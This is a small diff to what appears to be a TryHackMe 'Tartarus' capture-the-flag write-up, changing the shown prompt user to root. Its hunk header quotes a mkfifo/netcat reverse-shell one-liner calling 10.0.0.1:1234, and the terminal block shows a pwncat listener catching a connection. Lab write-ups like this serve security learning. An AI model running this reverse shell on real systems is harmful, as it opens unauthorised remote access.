@@ -161,7 +161,7 @@ rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f
 
 Yessss
 ```terminal
-┌─[silver@parrot]─[~/Desktop/tryhackme/tartarus]
+┌─[root@parrot]─[~/Desktop/tryhackme/tartarus]
 └──╼ $pwncat --listen --port 4444
 [10:42:02] received connection from 10.10.168.38:35120                                                                  connect.py:149
 [10:42:05] new host w/ hash 43d11761713cfc52d9e6fe891bda5715                                                             victim.py:328
